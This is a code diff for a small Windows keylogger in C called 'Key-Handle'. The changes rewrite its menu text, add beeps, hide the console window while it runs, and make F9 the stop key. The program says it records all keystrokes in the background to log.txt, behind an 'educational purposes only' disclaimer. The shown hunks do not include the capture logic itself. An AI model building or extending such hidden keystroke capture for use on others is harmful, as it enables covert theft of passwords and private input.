@@ -9,7 +9,7 @@
     #define true 1
 #endif
 
-void renderMenu(); // function prototype
+void renderMenu(); /* function prototype */
 
 void clear() {
     system("cls");
@@ -23,24 +23,22 @@ void handleDirectory() {
 }
 
 void renderMenu() { 
-    size_t input = 0;
-    while(input != 1 || input != 2) {
-        clear();
-        printf("\n[ Key-Handle ] - By alta\n"
-         "-------------------------------------------------------------------------------------\n"
-         "Key-Handle is a simple key capturing program that runs as a process in the background\n"
-         "and writes the keystrokes to a textfile in the directory the program was ran\n"
-         "DISCLAIMER: alta is not responsible for any malicious use of this software,\n"
-         "            it was made for educational purposes only.\n"
-         "-------------------------------------------------------------------------------------\n\n"
-         "1) Start capturing\n"
-         "2) Configure write directory\n\n"
-         "Input>%c", ' ');
-        scanf("%d", input);
+    printf("\n[ Key-Handle ] - By alta\n\n"
+        "Please read the following carefully...\n\n"
+        "-------------------------------------------------------------------------------------\n"
+        "Key-Handle is a simple key capturing program that runs hidden in the background\n"
+        "and writes the keystrokes to a textfile in the directory the program was ran from.\n\n"
+        "### DISCLAIMER: alta is not responsible for any malicious use of this software, ###\n"
+        "###             it was made for educational purposes only.                      ###\n"
+        "-------------------------------------------------------------------------------------\n\n"
+        "Once capturing begins:\n"
+        "You will hear 3 beeps, this console will be hidden and will capture all key strokes \n"
+        "in the background. When you're done capturing, press the F9 key, you will hear a \n"
+        "final beep to confirm everything closed successfully and the program will create \n"
+        "a log.txt file summarising the monitoring session.\n\n"
+        "Press enter to start capturing...%c", ' ');
+    getchar();
 
-        if(input == 2) { handleDirectory(); }
-    } 
-    // If input == 1 we return to main.
 }
 
 int main(int argc, char* argv[]) {
@@ -52,15 +50,26 @@ int main(int argc, char* argv[]) {
 
     while(1) {
 
-        if(showMenu) { renderMenu(); }
-        showMenu = false;
+        if(showMenu) { 
+            renderMenu(); 
+            for (size_t i = 0; i < 3; i++) {
+                MessageBeep(0xFFFFFF);
+                Sleep(500);
+            }
+            ShowWindow(window,0);
+            showMenu = false;
+        }
+
         
-        ShowWindow(window,0);
-        //close program when Esc pressed
-        if (GetAsyncKeyState(VK_ESCAPE) & 0x8000) {
+        /* If the terminate key (F9) is pressed. */
+        if (GetAsyncKeyState(VK_F9) & 0x8000) {
+            MessageBeep(0xFFFFFF);
+            ShowWindow(window, 1);
+            puts("\n\n\n\n\n\n\n\nProgram has terminated, please check the log.txt file.\n"
+                 "Press enter to close this terminal...@");
+            getchar();
             break;
         }
-    }
-    
+    } /* End of main program loop */
     return EXIT_SUCCESS;
 }
